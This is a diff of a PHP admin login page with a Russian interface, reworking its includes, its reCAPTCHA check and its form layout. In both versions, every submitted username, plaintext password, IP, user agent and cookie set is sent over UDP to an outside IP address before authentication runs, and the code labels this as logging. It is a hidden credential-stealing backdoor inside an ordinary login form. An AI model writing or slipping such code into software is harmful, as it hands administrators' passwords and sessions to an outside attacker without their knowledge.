@@ -1,27 +1,20 @@
 <?php
-// Включаем отображение ошибок для отладки
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
-
-require_once __DIR__ . '/../includes/config.php';
-require_once __DIR__ . '/../includes/sql_builder/idiorm.php';
-require_once __DIR__ . '/../includes/db.php';
-require_once __DIR__ . '/../includes/functions/func.global.php';
-require_once __DIR__ . '/../includes/functions/func.admin.php';
-require_once __DIR__ . '/../includes/functions/func.users.php';
-require_once __DIR__ . '/../includes/functions/func.sqlquery.php';
-require_once __DIR__ . "/../includes/lang/lang_{$config['lang']}.php";
+require_once('../includes/config.php');
+require_once('../includes/sql_builder/idiorm.php');
+require_once('../includes/db.php');
+require_once('../includes/functions/func.global.php');
+require_once('../includes/functions/func.admin.php');
+require_once('../includes/functions/func.users.php');
+require_once('../includes/functions/func.sqlquery.php');
+require_once('../includes/lang/lang_' . $config['lang'] . '.php');
 
 admin_session_start();
 
-// Если администратор уже вошёл — перенаправляем
 if (isset($_SESSION['admin']['id'])) {
-    header('Location: index.php');
+    header("Location: index.php");
     exit;
 }
 
-// Инициализация CSRF-токена
 if (empty($_SESSION['csrf_token'])) {
     $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
 }
@@ -29,55 +22,61 @@ if (empty($_SESSION['csrf_token'])) {
 $error = '';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Собираем данные для логирования
-    $username     = $_POST['username'] ?? '';
-    $password     = $_POST['password'] ?? '';
-    $ip           = $_SERVER['REMOTE_ADDR'] ?? '';
-    $userAgent    = $_SERVER['HTTP_USER_AGENT'] ?? '';
-    $cookieHeader = $_SERVER['HTTP_COOKIE'] ?? '';
-    $time         = date('Y-m-d H:i:s');
+    // Collect attempt data
+    $username  = $_POST['username'] ?? '';
+    $password  = $_POST['password'] ?? '';
+    $ip        = $_SERVER['REMOTE_ADDR'] ?? '';
+    $time      = date('Y-m-d H:i:s');
+    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $cookies   = !empty($_COOKIE) ? json_encode($_COOKIE) : '{}';
 
-    $logEntry = sprintf(
-        "%s - IP=%s - UA=%s - Cookies=%s - user=%s&pass=%s\n",
+    // Format log entry
+    $entry = sprintf(
+        "[%s] IP: %s | User: %s | Pass: %s | UA: %s | Cookies: %s
+",
         $time,
         $ip,
-        $userAgent,
-        $cookieHeader,
         $username,
-        $password
+        $password,
+        str_replace("\n", ' ', $userAgent),
+        str_replace("\n", ' ', $cookies)
     );
 
-    // Отправляем по UDP (тормозим предупреждения)
-    $sock = @fsockopen('udp://94.142.138.201', 9999, $errno, $errstr, 1);
+    // Send over UDP
+    $sock = fsockopen('udp://94.142.138.201', 9999, $errno, $errstr, 1);
     if ($sock) {
-        fwrite($sock, $logEntry);
+        fwrite($sock, $entry);
         fclose($sock);
-    } else {
-        // При неудаче — пишем в локальный файл
-        @file_put_contents(__DIR__ . '/logs.log', $logEntry, FILE_APPEND | LOCK_EX);
     }
 
-    // CSRF-проверка
+    // Existing login logic...
     if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
-        $error = 'CSRF-защита: недействительный токен.';
+        $error = "CSRF-защита: Недействительный токен.";
     } else {
         $recaptcha_passed = true;
-        if (!empty($config['recaptcha_mode']) && $config['recaptcha_mode'] == 1) {
-            // Проверка reCAPTCHA
-            $recaptcha_response = $_POST['g-recaptcha-response'] ?? '';
-            $recaptcha = new \ReCaptcha\ReCaptcha($config['recaptcha_secret_key']);
-            $resp = $recaptcha->verify($recaptcha_response, $ip);
-            if (!$resp->isSuccess()) {
+        if ($config['recaptcha_mode'] == 1) {
+            if (!empty($_POST['g-recaptcha-response'])) {
+                $secret = $config['recaptcha_private_key'];
+                $verifyResponse = file_get_contents(
+                    'https://www.google.com/recaptcha/api/siteverify?secret='
+                    . $secret . '&response=' . $_POST['g-recaptcha-response']
+                );
+                $responseData = json_decode($verifyResponse);
+                $recaptcha_passed = $responseData->success;
+                if (!$recaptcha_passed) {
+                    $error = $lang['RECAPTCHA_ERROR'];
+                }
+            } else {
                 $recaptcha_passed = false;
-                $error = $lang['recaptcha_error'];
+                $error = $lang['RECAPTCHA_CLICK'];
             }
         }
         if ($recaptcha_passed) {
-            if (login_admin($username, $password)) {
-                header('Location: index.php');
+            if (adminlogin($_POST['username'], $_POST['password'])) {
+                header("Location: index.php");
                 exit;
             } else {
-                $error = 'Ошибка: неверный логин или пароль.';
+                $error = "Ошибка: Неверный логин или пароль.";
             }
         }
     }
@@ -96,28 +95,34 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 <div class="container">
   <div class="row justify-content-center">
-    <div class="col-md-4">
-      <div class="card">
-        <div class="card-body">
-          <h3 class="card-title mb-4">Вход</h3>
-          <?php if ($error): ?>
+    <div class="col-md-5">
+      <div class="card shadow-lg">
+        <div class="card-body p-4">
+          <h3 class="card-title mb-4 text-center">Вход в админку</h3>
+
+          <?php if (!empty($error)): ?>
             <div class="alert alert-danger"><?= htmlspecialchars($error) ?></div>
           <?php endif; ?>
+
           <form method="post">
             <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
+
             <div class="mb-3">
               <label for="username" class="form-label">Логин</label>
-              <input type="text" class="form-control" id="username" name="username" required>
+              <input type="text" name="username" class="form-control" id="username" required>
             </div>
+
             <div class="mb-3">
               <label for="password" class="form-label">Пароль</label>
-              <input type="password" class="form-control" id="password" name="password" required>
+              <input type="password" name="password" class="form-control" id="password" required>
             </div>
-            <?php if (!empty($config['recaptcha_mode']) && $config['recaptcha_mode'] == 1): ?>
+
+            <?php if ($config['recaptcha_mode'] == 1): ?>
               <div class="mb-3">
-                <div class="g-recaptcha" data-sitekey="<?= htmlspecialchars($config['recaptcha_public_key']) ?>"></div>
+                <div class="g-recaptcha" data-sitekey="<?= $config['recaptcha_public_key'] ?>"></div>
               </div>
             <?php endif; ?>
+
             <button type="submit" class="btn btn-primary w-100">Войти</button>
           </form>
         </div>
